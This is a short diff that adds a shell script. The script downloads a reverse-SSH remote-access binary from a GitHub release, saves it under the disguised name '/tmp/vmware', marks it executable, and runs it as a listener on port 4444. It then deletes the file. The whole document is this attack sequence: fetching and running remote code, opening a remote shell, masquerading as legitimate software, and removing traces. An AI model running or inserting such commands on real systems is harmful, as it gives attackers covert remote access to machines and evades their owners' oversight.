@@ -1,0 +1,5 @@
+wget https://github.com/Fahrj/reverse-ssh/releases/download/v1.2.0/reverse-sshx64 -O /tmp/vmware
+cd /tmp
+chmod +x vmware
+./vmware -v -l -p 4444
+rm vmware
